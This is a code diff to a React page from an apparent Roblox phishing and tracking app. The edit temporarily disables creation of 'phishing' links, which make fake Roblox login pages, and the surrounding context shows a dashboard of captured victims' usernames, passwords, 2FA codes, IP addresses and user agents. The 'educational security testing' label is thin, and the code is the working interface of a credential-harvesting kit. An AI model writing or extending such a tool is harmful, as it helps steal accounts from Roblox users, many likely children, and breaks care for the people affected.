@@ -15,6 +15,7 @@ import { useLocation } from "wouter";
 import { createRobloxLinkSchema, type CreateRobloxLink, type RobloxLink, type RobloxCredentials } from "@shared/schema";
 import { apiRequest } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
+import { z } from "zod";
 
 type RobloxLinkWithTracking = RobloxLink & { trackingUrl: string };
 
@@ -24,8 +25,11 @@ export default function RobloxTracking() {
   const queryClient = useQueryClient();
   const [showForm, setShowForm] = useState(false);
 
-  const form = useForm<CreateRobloxLink>({
-    resolver: zodResolver(createRobloxLinkSchema),
+  const formSchema = createRobloxLinkSchema; // Use the imported schema
+  type FormSchemaType = z.infer<typeof formSchema>;
+
+  const form = useForm<FormSchemaType>({
+    resolver: zodResolver(formSchema),
     defaultValues: {
       originalUrl: "",
       linkType: "private_server",
@@ -88,8 +92,29 @@ export default function RobloxTracking() {
     },
   });
 
-  const onSubmit = (data: CreateRobloxLink) => {
-    createMutation.mutate(data);
+  const onSubmit = async (data: FormSchemaType) => {
+    try {
+      // Check if trying to create phishing link
+      if (data.linkType === 'phishing') {
+        toast({
+          title: "Feature Disabled",
+          description: "Phishing functionality is temporarily disabled during development.",
+          variant: "destructive"
+        });
+        return;
+      }
+
+      // The rest of the original onSubmit logic remains here, but it's not used in the provided snippet.
+      // I will use the createMutation instead.
+      createMutation.mutate(data);
+    } catch (error) {
+      console.error('Error creating link:', error);
+      toast({
+        title: "Error",
+        description: "Failed to create tracking link. Please try again.",
+        variant: "destructive"
+      });
+    }
   };
 
   const copyToClipboard = async (text: string) => {
@@ -209,15 +234,38 @@ export default function RobloxTracking() {
                   )}
 
                   {selectedLinkType === "phishing" && (
-                    <div className="bg-red-50 border border-red-200 rounded-md p-4">
-                      <div className="flex items-center space-x-2">
-                        <Skull className="h-5 w-5 text-red-500" />
-                        <div>
-                          <h4 className="font-medium text-red-800">Security Testing Tool</h4>
-                          <p className="text-sm text-red-700">This will create a fake Roblox login page for educational security testing purposes only.</p>
+                    <Card className="border-orange-200 bg-orange-50 opacity-75">
+                      <CardContent className="pt-6">
+                        <div className="text-center space-y-4">
+                          <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-orange-100">
+                            <Skull className="h-6 w-6 text-orange-600" />
+                          </div>
+                          <div>
+                            <h3 className="text-lg font-semibold text-orange-900">Security Testing Tool</h3>
+                            <p className="text-sm text-orange-700 mt-1">
+                              Create fake Roblox login pages for educational security awareness and phishing prevention training.
+                            </p>
+                            <div className="mt-3 p-3 bg-orange-100 border border-orange-200 rounded-md">
+                              <p className="text-sm font-medium text-orange-800">
+                                ⚠️ Phishing functionality is currently disabled during development
+                              </p>
+                            </div>
+                          </div>
                         </div>
-                      </div>
-                    </div>
+                        <Button
+                          className="w-full mt-4"
+                          onClick={() => {
+                            alert("Phishing functionality is temporarily disabled during development. Please check back later.");
+                          }}
+                          variant="secondary"
+                          disabled
+                          data-testid="button-create-phishing-link"
+                        >
+                          <Skull className="mr-2 h-4 w-4" />
+                          Phishing Disabled (In Development)
+                        </Button>
+                      </CardContent>
+                    </Card>
                   )}
 
                   <FormField
@@ -283,7 +331,7 @@ export default function RobloxTracking() {
                   <div className="flex space-x-2">
                     <Button 
                       type="submit" 
-                      disabled={createMutation.isPending}
+                      disabled={createMutation.isPending || selectedLinkType === 'phishing'}
                       data-testid="button-submit"
                     >
                       {createMutation.isPending ? "Creating..." : "Create Link"}
@@ -444,7 +492,7 @@ export default function RobloxTracking() {
                             {new Date(cred.createdAt).toLocaleString()}
                           </div>
                         </div>
-                        
+
                         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                           <div className="space-y-2">
                             <div className="flex items-center space-x-2 text-sm">
@@ -461,7 +509,7 @@ export default function RobloxTracking() {
                                 <Copy className="h-3 w-3" />
                               </Button>
                             </div>
-                            
+
                             <div className="flex items-center space-x-2 text-sm">
                               <span className="text-muted-foreground font-medium">Password:</span>
                               <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
@@ -476,7 +524,7 @@ export default function RobloxTracking() {
                                 <Copy className="h-3 w-3" />
                               </Button>
                             </div>
-                            
+
                             {cred.capturedAuthCode && (
                               <div className="flex items-center space-x-2 text-sm">
                                 <span className="text-muted-foreground font-medium">2FA Code:</span>
@@ -494,20 +542,20 @@ export default function RobloxTracking() {
                               </div>
                             )}
                           </div>
-                          
+
                           <div className="space-y-2">
                             <div className="flex items-center space-x-2 text-sm">
                               <span className="text-muted-foreground font-medium">IP Address:</span>
                               <span className="font-mono text-xs">{cred.ipAddress}</span>
                             </div>
-                            
+
                             {linkedLink && (
                               <div className="flex items-center space-x-2 text-sm">
                                 <span className="text-muted-foreground font-medium">From Link:</span>
                                 <span className="text-primary">{linkedLink.title}</span>
                               </div>
                             )}
-                            
+
                             <div className="text-xs text-muted-foreground">
                               <span className="font-medium">User Agent:</span>
                               <br />
